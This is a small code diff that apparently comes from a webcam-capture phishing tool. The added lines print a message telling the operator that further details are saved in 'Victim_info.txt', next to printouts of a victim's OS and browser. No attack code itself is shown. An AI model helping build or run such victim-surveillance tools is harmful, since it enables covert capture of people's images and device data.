@@ -154,6 +154,9 @@ def webcam():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
                     sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
